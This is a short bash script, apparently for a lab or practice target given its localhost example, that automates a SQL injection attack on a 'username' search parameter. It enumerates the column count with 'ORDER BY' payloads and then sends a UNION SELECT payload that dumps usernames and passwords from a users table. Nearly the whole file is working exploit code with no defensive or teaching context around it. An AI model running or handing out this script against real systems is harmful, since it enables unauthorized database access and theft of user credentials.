#!/bin/bash


read -p "enter a target url ex: http://localhost:8000/search.php :: " TARGET

MAX_COLUM=10


for i in $(seq $MAX_COLUM); do


status=$(curl -s -o /dev/null -w "%{http_code}" -G --data-urlencode "username=abc' ORDER BY $i#" "$TARGET")



if [ "$status" -eq 500 ]; then
    echo "Column count: $(($i-1))"

  
    break
fi


echo "DEBUG (i=$i): $status"


done

UNION_PAYLOAD="abc' UNION SELECT username,password FROM users#"

body=$(curl -s -G --data-urlencode "username=$UNION_PAYLOAD" "$TARGET")

echo "Extracted data:"

echo "$body"


